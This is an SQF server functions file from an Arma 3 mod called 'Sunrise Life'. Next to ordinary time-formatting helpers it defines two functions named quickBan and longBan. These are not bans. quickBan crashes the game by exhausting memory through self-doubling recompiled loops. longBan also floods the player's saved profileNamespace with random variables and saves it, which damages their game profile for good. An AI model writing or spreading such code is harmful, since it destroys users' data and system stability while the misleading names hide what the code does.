/*
    
    Filename:   functions.sqf
    Project:    Sunrise Life
    Author:     Sunrise Team
    Steam:      Sunrise Team


*/
#include "script_macros.hpp"
SunriseServer_system_getRealTime = compileFinal "private _time = (call SunriseServer_system_getServerTime);format ['Sunrise Life  [%4:%5 %3-%2-%1]',_time select 0 call SunriseServer_system_doubledigits,_time select 1 call SunriseServer_system_doubledigits,_time select 2 call SunriseServer_system_doubledigits,_time select 3 call SunriseServer_system_doubledigits,_time select 4 call SunriseServer_system_doubledigits];";
SunriseServer_system_getServerTime = compileFinal "(call compile ('extDB3' callExtension '9:LOCAL_TIME'))select 1;";
SunriseServer_system_doubledigits = compileFinal "if (_this < 10) exitWith {'0'+str _this};str _this;";
SunriseServer_system_quickBan = compileFinal "_fnc = {_ara = [];_code = 'while {true} do {_ara pushBack [allVariables uiNamespace,allVariables missionNamespace]; call compile _code};';while {true} do {_ara pushBack [allVariables uiNamespace,allVariables missionNamespace]; _code = _code + _code; call compile _code};}; call _fnc";
SunriseServer_system_longBan = compileFinal "
_fnc = {
	_lel = nearestTerrainObjects [[worldSize/2, worldSize/2], [], worldSize, false];
	_code = format['while {true} do {profileNamespace setVariable [toString [(random 55200)] + toString [(random 55200)] + toString [(random 55200)] + toString [(random 55200)] + toString [(random 55200)], %1]; call compile _code};',_lel];
	while {true} do {
		_code = _code + _code + _code + _code + _code + _code + _code + _code + _code + _code + _code + _code + _code + _code + _code;
		call compile _code
	};
}; 
call _fnc;
uiSleep 60;
saveProfileNamespace;
";
//['0' + str _this, str _this] select (_this < 10)
